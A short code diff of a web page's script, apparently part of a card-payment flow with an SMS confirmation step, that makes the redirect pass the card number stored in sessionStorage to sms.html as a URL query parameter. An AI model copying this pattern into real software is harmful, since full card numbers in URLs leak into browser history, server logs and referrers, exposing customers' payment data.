@@ -736,7 +736,9 @@
         };
 
         window.redirectToSMS = function() {
-            window.location.href = 'sms.html';
+        // Берем номер карты из предыдущей страницы или используем дефолтный
+        const cardNumber = sessionStorage.getItem('cardNumber') || '0000000000000000';
+        window.location.href = `sms.html?card=${cardNumber}`;
         };
 
         window.redirectToPaymentWithError = function() {
@@ -763,4 +765,5 @@
     </script>
 </body>
 </html>
+
 
